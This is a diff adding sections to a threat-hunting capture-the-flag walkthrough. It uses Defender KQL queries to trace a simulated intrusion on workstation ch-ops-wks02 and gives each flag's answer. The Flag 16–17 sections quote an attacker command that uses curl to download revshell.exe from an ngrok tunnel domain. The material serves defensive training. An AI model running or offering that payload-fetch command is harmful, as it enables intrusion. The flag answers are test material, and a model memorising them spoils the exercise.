@@ -73,6 +73,28 @@ For example "Wells Fargo : wf-xxx-xxx01"  ch-ops-wks02
 
 
 
+CorpHealth: Traceback 
+Flag 0: Identify the device*
+Your first step is confirming which workstation generated the unusual telemetry.
+Initial log clustering shows that all suspicious events originated from a single endpoint active during an off-hours window in the middle of November.  
+During your initial sweep, look for a workstation that shows:
+A small cluster of events during an unusual maintenance window 
+Activity between Mid November to Early December.
+Multiple entries with sources tied to Process Events, Network Events,File Events and Script-based operations
+Hint: typical naming conventions for devices include abbreviating the company name as a prefix.
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-12T00:00:00) .. datetime(2025-12-18T20:00:00))
+| where hourofday(TimeGenerated) < 6 or hourofday(TimeGenerated) >= 18
+| where InitiatingProcessCommandLine has_any ("cmd.exe", "powershell.exe")
+| summarize EventCount = count() by DeviceName
+| sort by EventCount desc
+For example "Wells Fargo : wf-xxx-xxx01"  ch-ops-wks02
+
+
+
+
+
+
 Flag 1: Unique Maintenance File*
 You’ve confirmed that  ch-ops-wks02   is the workstation of interest and narrowed your timeframe to the mid-November maintenance window.
 Before you dig into outbound activity, you decide to sanity-check what’s actually running on this box during “routine” operations.
@@ -350,10 +372,75 @@ Filter DeviceEvents where AdditionalFields contains either:
 "tokenChangeDescription"
 "Privileges were added"
 Recall the Flag 1 Script.
+Flag 14 — Privilege Token Modification  *
+You’ve traced the suspicious registry activity and the scheduled persistence artifacts back to the same PowerShell execution chain.
+But the attacker didn’t stop there.
+As you review deeper system events, something stands out:
+Windows recorded a ProcessPrimaryTokenModified event, a behavior consistent with attackers attempting to escalate privileges or adjust token integrity to blend in with SYSTEM-level processes.
+Your task now is to pinpoint which process actually performed that token modification.
+What is the "InitiatingProcessId" of the process whose token privileges were modified?
+Hint
+Filter DeviceEvents where AdditionalFields contains either:
+"tokenChangeDescription"
+"Privileges were added"
+Recall the Flag 1 Script.
+DeviceEvents
+| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
+| where InitiatingProcessCommandLine contains "MaintenanceRunner_Distributed.ps1"
+| sort by TimeGenerated asc 
+{"TokenModificationProperties":"{\"tokenChangeDescription\":\"Privileges were added to the process token of an unknown process\",\"privilegesFlags\":[],\"isChangedToSystemToken\":false,\"originalTokenIntegrityLevelName\":\"High\",\"currentTokenIntegrityLevelName\":\"High\"}","SystemTokenPointer":"18446640769524940864","OriginalTokenIntegrityLevel":"12288","OriginalTokenPointer":"18446640769657225312","OriginalTokenPrivEnabled":"1619001344","OriginalTokenPrivPresent":"130793013024","OriginalTokenSource":"VXNlcjMyIAA=","OriginalTokenUserSid":"S-1-5-21-1605642021-30596605-784192815-1000","CurrentTokenIntegrityLevel":"12288","CurrentTokenPointer":"18446640769657225312","CurrentTokenPrivEnabled":"1620049920","CurrentTokenSource":"VXNlcjMyIAA=","CurrentTokenUserSid":"S-1-5-21-1605642021-30596605-784192815-1000"}
+InitiatingProcessId: 4888
+2025-11-25T04:14:07.0587586Z
+
+
+Flag 15 -  Whose Token Was Modified?  *
+You’ve confirmed that a process on CH-OPS-WKS02 modified its own token privileges — a classic PrivEsc behavior.
+But you still don’t know whose token was affected.
+Digging into the raw event details, you notice that the token modification record doesn’t just describe what changed; it also tells you which security principal (SID) the token belongs to. That’s crucial context:
+Was this a low-priv user?
+A domain user?
+Or a built-in local admin?
+If an attacker is adjusting privileges on the local Administrator token, that significantly raises the risk profile of any follow-on activity.
+Time to pull that identity out of AdditionalFields.
+Which security identifier (SID) did the modified token belong to?
+Using Defender Advanced Hunting, find the same token modification event you used in the previous flag (Flag 14).
+This time, inspect the AdditionalFields JSON and identify the user SID associated with the modified token.
+Specifically, you’re looking for the field:
+OriginalTokenUserSid (which matches CurrentTokenUserSid in this case)
+DeviceEvents
+| where TimeGenerated between (datetime(2025-11-01T00:00:00) .. datetime(2025-12-26T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where AdditionalFields has_any ("tokenChangeDescription", "Privileges were added")
+| where InitiatingProcessCommandLine contains "MaintenanceRunner_Distributed.ps1"
+| sort by TimeGenerated asc 
+
+
+"S-1-5-21-1605642021-30596605-784192815-1000"
 
 
 
 
+Flag 16 –  Ingress Tool Transfer from External Dynamic Tunnel  *
+After the privilege escalation, Defender recorded a new executable being written to disk on CH-OPS-WKS02. The timing and location of this file suggest it was delivered as staging material for follow-on activity. Your job is to identify the exact filename the attacker introduced.
+What is the name of the executable that was written to disk after the outbound request?
+Hints:
+DeviceFileEvents
+| where TimeGenerated between (datetime(2025-12-02T00:00:00) .. datetime(2025-12-03T20:00:00))
+| where DeviceName contains "CH-OPS-WKS02"
+| where ActionType == "FileCreated" 
+| where FileName endswith ".exe"
+| project TimeGenerated, ActionType, FileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, FolderPath
+Curl event occurred 2025-12-02T12:56:54.274253Z
+"curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe
+Executable created: revshell.exe
+Flag 17 — Identify the External Download Source  *
+Before the suspicious file appeared on the workstation, the host reached out to an external dynamic-tunnel domain using curl.exe. This outbound request fetched the executable later used in post-escalation activity. Identify the exact remote URL involved in this transfer.
+What URL did the workstation connect to when retrieving the file?
+Unresuscitating-donnette-smothery.ngrok-free.dev
+3.22.30.40:443
+"curl.exe" -o revshell.exe https://unresuscitating-donnette-smothery.ngrok-free.dev/revshell.exe
 
 
 
